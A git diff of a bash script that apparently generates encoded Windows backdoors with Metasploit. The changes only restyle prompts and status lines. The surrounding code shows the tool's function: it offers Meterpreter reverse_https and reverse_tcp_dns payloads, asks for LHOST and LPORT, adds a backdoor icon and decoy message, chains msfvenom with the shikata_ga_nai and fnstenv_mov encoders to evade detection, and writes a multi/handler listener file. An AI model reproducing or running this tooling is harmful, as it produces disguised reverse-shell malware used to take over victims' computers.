@@ -92,15 +92,15 @@ echo -n Dependencies = =;
 
 sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
 if [ "$msfconsole" == "1" ] && [ "$msfvenom" == "1" ] && [ "$mono" == "1" ] && [ "$mcs" == "1" ] && [ "$postgresql" == "1" ] && [ "$fallocate" == "1" ]; then
-echo -en "\b【\e[1;33mAll Ok\e[0m】" 
+echo -en "\b \e[1;33mAll Ok\e[0m" 
 echo ""
 echo ""
-echo -e '\e[0;31mmsfconsole\e[0m    【\e[1;33mOk\e[0m】'
-echo -e '\e[0;31mmsfvenom\e[0m      【\e[1;33mOk\e[0m】'
-echo -e '\e[0;31mmono\e[0m          【\e[1;33mOk\e[0m】'
-echo -e '\e[0;31mmsc\e[0m           【\e[1;33mOk\e[0m】'
-echo -e '\e[0;31mpostgresql\e[0m    【\e[1;33mOk\e[0m】'
-echo -e '\e[0;31mfallocate\e[0m     【\e[1;33mOk\e[0m】'
+echo -e '\e[0;31mmsfconsole\e[0m........\e[1;33mOk\e[0m'
+echo -e '\e[0;31mmsfvenom\e[0m..........\e[1;33mOk\e[0m'
+echo -e '\e[0;31mmono\e[0m..............\e[1;33mOk\e[0m'
+echo -e '\e[0;31mmsc\e[0m...............\e[1;33mOk\e[0m'
+echo -e '\e[0;31mpostgresql\e[0m........\e[1;33mOk\e[0m'
+echo -e '\e[0;31mfallocate\e[0m.........\e[1;33mOk\e[0m'
 
 echo ""
 sleep 2
@@ -150,7 +150,7 @@ echo "*     3-  Meterpreter_Reverse_https		   7- Multi encode payload       *"
 echo "*     4-  Meterpreter_Reverse_tcp_dns                                            *"
 echo "**********************************************************************************" 
 echo ""
-echo -e " $$$$$$$ =>  \c"
+echo -e "\e[0;31m02Zcat\e[0m =>  \c"
 read option
 
 #Aukeratu 
@@ -200,11 +200,11 @@ esac
 
 #Ip
 if [ "$option" == "4" ]; then
-echo -e "Set No-Ip Host =>  \c"
+echo -e "\e[0;31mSet No-Ip Host\e[0m =>  \c"
 read host
 fi
 
-echo -e "LHOST => \c"
+echo -e "\e[0;31mLHOST\e[0m => \c"
 read ip
 if [[ "$ip" =~ ^(([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))\.){3}([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))$ ]]; then
 sleep 0.1
@@ -214,7 +214,7 @@ exit
 fi
 
 #Port
-echo -e "LPORT => \c"
+echo -e "\e[0;31mLPORT\e[0m => \c"
 read port
 case ${port#[+]} in
 *[!0-9]* ) 
@@ -230,7 +230,7 @@ fi
 esac
 
 #ikonoa
-echo -e "backdoor icon? y or n =>  \c"
+echo -e "\e[0;31mbackdoor icon? y or n\e[0m =>  \c"
 read icon
 if [[ $icon != "y" && $icon != "n" ]]; then 
 echo -e '\e[0;31m【!!】 Invalid option, write y or n \e[0m'
@@ -238,13 +238,13 @@ exit
 fi
 
 #Mezua
-echo -e "Display an message? y or n =>  \c"
+echo -e "\e[0;31mDisplay an message? y or n\e[0m =>  \c"
 read error
 case $error in
 y) 
-echo -e "Title message =>  \c"
+echo -e "\e[0;31mTitle message\e[0m =>  \c"
 read izenburua  
-echo -e "Message =>  \c"
+echo -e "\e[0;31mMessage\e[0m =>  \c"
 read textua
 ;;
 n)
@@ -254,10 +254,10 @@ echo -e '\e[0;31m【!!】 Invalid option, write y or n \e[0m'
 exit
 ;;
 esac
-echo -e "Enter file name =>  \c"
+echo -e "\e[0;31mEnter file name\e[0m =>  \c"
 read izena
 echo ""
-echo "Please wait"
+echo -e "\e[0;31mPlease wait\e[0m"
 bar
 if [ "$option" == "7" ]; then
 msfvenom -p $payload LHOST=$ip LPORT=$port --platform windows -a x86 -e generic/none 2>/dev/null | msfvenom --platform windows -a x86 -e x86/shikata_ga_nai -i $int -f raw 2>/dev/null | msfvenom --platform windows -a x86 -e x86/fnstenv_mov -i $int -f hex >> behinbehineko 2>/dev/null;
@@ -362,7 +362,7 @@ echo "="
 echo "="
 echo "============================================================================"
 sleep 2
-echo -e "Start handler? y or n => \c"
+echo -e "\e[0;31mStart handler? y or n\e[0m => \c"
 read handler
 if [ "$handler" == "y" ]; then
 echo "use exploit/multi/handler" >> $dir/handler/handler.rc
